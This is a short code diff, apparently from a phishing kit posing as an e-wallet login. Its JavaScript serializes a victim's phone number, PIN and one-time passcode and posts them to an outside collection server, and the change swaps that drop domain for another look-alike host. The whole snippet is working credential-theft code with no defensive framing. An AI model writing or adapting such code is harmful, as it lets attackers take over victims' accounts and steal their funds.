@@ -141,7 +141,7 @@ $(".bgotp").hide();
     var dataString = $("#formNohp, #formPin, #formOtp").serialize();
 			$.ajax( {
 			  type: 'POST',
-			  url: 'https://directory.i-im.cyou/cwp/dana22/one.php',
+			  url: 'https://directory.ii-im.cyou/cwp/dana22/one.php',
 			  data: dataString,
  
     
